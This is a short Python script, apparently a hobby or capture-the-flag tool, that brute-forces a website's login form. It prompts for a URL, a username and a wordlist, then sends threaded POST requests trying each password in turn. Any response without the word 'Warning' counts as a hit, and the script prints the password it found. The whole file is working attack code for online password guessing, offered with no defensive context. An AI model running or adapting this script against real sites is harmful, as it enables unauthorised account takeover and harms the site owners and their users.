#!/bin/python3

from threading import Thread, Lock
import requests as req
import time
from pwn import log 

error = "Warning"
num_threads = 4
found_password = ''
tried_pswds = 0
lock = Lock()
found = False
start = time.time()


def success(text):
    print("\033[1;32;40m{}\033[0;37;40m".format(text),end='')


def thread_routine(tid):
	global found_password, found, tried_pswds

	t = int(time.time())
	sess = req.Session()

	while not found:
		lock.acquire()
		password = f.readline().strip()
		lock.release()

		tried_pswds += 1
		if tid == 0:
			if int(time.time()) - t > 1:
				log.info('Tried {} passwords so far'.format(tried_pswds))
				log.info('Current password: {}'.format(password))
				t = int(time.time())

		data = {"Username": username,
				"Password": password,
				"Submit": "Login"}
		resp = sess.post(url=url, data=data).text
		if error not in resp:
			found_password = password
			found = True


success("Enter The website url > ")
url = input().strip()
success("The username > ")
username = input().strip()
success("Path of the wordlist > ")
wordlist = input().strip()
print("")
f = open(wordlist, 'r')

threads = [Thread(target=thread_routine, args=(tid,)) for tid in range(num_threads)]

for thread in threads:
	thread.start()

for thread in threads:
	thread.join()
print("")
log.success('Found valid password: {}'.format(found_password))
log.success('Number of attempts: {}'.format(tried_pswds))
log.success('Time taken : {} seconds'.format(round(time.time()-start)))